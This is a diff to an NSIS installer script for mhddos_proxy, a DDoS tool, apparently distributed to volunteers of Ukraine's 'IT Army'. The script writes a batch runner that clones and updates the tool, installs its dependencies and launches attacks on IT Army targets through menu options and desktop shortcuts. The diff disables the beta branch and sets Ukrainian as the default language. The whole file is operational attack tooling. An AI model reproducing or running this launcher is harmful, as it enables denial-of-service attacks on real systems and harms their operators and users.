@@ -118,12 +118,12 @@ Section ;RUNNER
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='' goto MAIN_INFO)$\r$\n"
   FileWrite $9 ":RUN_MHDDOS_PROXY$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy' goto ITARMY)$\r$\n"
-  FileWrite $9 ":RUN_MHDDOS_PROXY_BETA$\r$\n"
-  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_beta' goto ITARMY_BETA)$\r$\n"
+  ;FileWrite $9 ":RUN_MHDDOS_PROXY_BETA$\r$\n"
+  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_beta' goto ITARMY_BETA)$\r$\n"
   FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy' goto CLONE_MHDDOS_PROXY)$\r$\n"
-  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
-  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
+  ;FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
+  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
   
   FileWrite $9 ":run_clone_proxy_finder$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_proxy_finder' goto clone_proxy_finder)$\r$\n"
@@ -133,11 +133,11 @@ Section ;RUNNER
   FileWrite $9 ":MAIN_INFO$\r$\n"
   FileWrite $9 "ECHO.$\r$\n"
   FileWrite $9 "ECHO 1. Run ItArmy Attack$\r$\n"
-  FileWrite $9 "ECHO 2. Run ItArmy Attack BETA$\r$\n"
+  ;FileWrite $9 "ECHO 2. Run ItArmy Attack BETA$\r$\n"
   FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
   FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
   FileWrite $9 "if '%choice%'=='1' goto ITARMY$\r$\n"
-  FileWrite $9 "if '%choice%'=='2' goto ITARMY_BETA$\r$\n"
+  ;FileWrite $9 "if '%choice%'=='2' goto ITARMY_BETA$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
   FileWrite $9 ":CLONE_MHDDOS_PROXY$\r$\n"
@@ -150,13 +150,13 @@ Section ;RUNNER
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
-  FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
-  FileWrite $9 "CD $INSTDIR$\r$\n"
-  FileWrite $9 "git clone -b feature-async ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "goto END$\r$\n"
+  ;FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
+  ;FileWrite $9 "CD $INSTDIR$\r$\n"
+  ;FileWrite $9 "git clone -b feature-async ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  ;FileWrite $9 "git pull$\r$\n"
+  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  ;FileWrite $9 "goto END$\r$\n"
   
   FileWrite $9 ":ITARMY$\r$\n"
   FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
@@ -167,20 +167,20 @@ Section ;RUNNER
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "ECHO OK$\r$\n"
   FileWrite $9 "ECHO Start Attack ItArmy Target$\r$\n"
-  FileWrite $9 "python runner.py --itarmy --debug$\r$\n"
+  FileWrite $9 "python runner.py $(mhddos_lang) --itarmy$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
-  FileWrite $9 ":ITARMY_BETA$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Cheack requirements$\r$\n"
-  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Start Attack ItArmy Target BETA$\r$\n"
-  FileWrite $9 "python runner.py --itarmy --debug$\r$\n"
-  FileWrite $9 "goto END$\r$\n"
+  ;FileWrite $9 ":ITARMY_BETA$\r$\n"
+  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  ;FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  ;FileWrite $9 "git pull$\r$\n"
+  ;FileWrite $9 "ECHO OK$\r$\n"
+  ;FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  ;FileWrite $9 "ECHO OK$\r$\n"
+  ;FileWrite $9 "ECHO Start Attack ItArmy Target BETA$\r$\n"
+  ;FileWrite $9 "python runner.py $(mhddos_lang) --itarmy$\r$\n"
+  ;FileWrite $9 "goto END$\r$\n"
   
   FileWrite $9 ":clone_proxy_finder$\r$\n"
   FileWrite $9 "CD $INSTDIR$\r$\n"
@@ -215,13 +215,13 @@ Section	"mhddos_proxy";INSTALL MHDDOS_PROXY
 
 SectionEnd
 
-Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
-  SectionIn RO
-  SetOutPath $INSTDIR
- 
-  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
-  
-SectionEnd
+;Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
+;  SectionIn RO
+;  SetOutPath $INSTDIR
+; 
+;  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
+;  
+;SectionEnd
 
 ;ItArmy
 Section	$(inst_itarmy_req) ;"ItArm y of Ukraine Attack"
@@ -235,15 +235,15 @@ Section	$(inst_itarmy_req) ;"ItArm y of Ukraine Attack"
 SectionEnd
 
 ;ItArmy BETA
-Section	/o	$(inst_itarmy_beta_req) ;"ItArmy of Ukraine Attack BETA"
-
-  SetOutPath $INSTDIR
-  
-  File "resources\itarmy_beta.ico"
-  
-  CreateShortCut "$DESKTOP\$(inst_itarmy_beta_req).lnk" "$INSTDIR\runner.bat" "-itarmy_beta" "$INSTDIR\itarmy_beta.ico" 0
-
-SectionEnd
+;Section	/o	$(inst_itarmy_beta_req) ;"ItArmy of Ukraine Attack BETA"
+;
+;  SetOutPath $INSTDIR
+;  
+;  File "resources\itarmy_beta.ico"
+;  
+;  CreateShortCut "$DESKTOP\$(inst_itarmy_beta_req).lnk" "$INSTDIR\runner.bat" "-itarmy_beta" "$INSTDIR\itarmy_beta.ico" 0
+;
+;SectionEnd
 
 ;Proxy Finder
 Section	/o	$(inst_pf_req)
@@ -260,8 +260,8 @@ SectionEnd
 
 Function .onInit
 
+  StrCpy $Language ${LANG_UKRAINIAN}
   !insertmacro MUI_LANGDLL_DISPLAY
-
 
   ;Search if mhddos_proxy_installer is already installed.
   FindFirst $0 $1 "$INSTDIR\${UNINSTALLER_NAME}.exe"
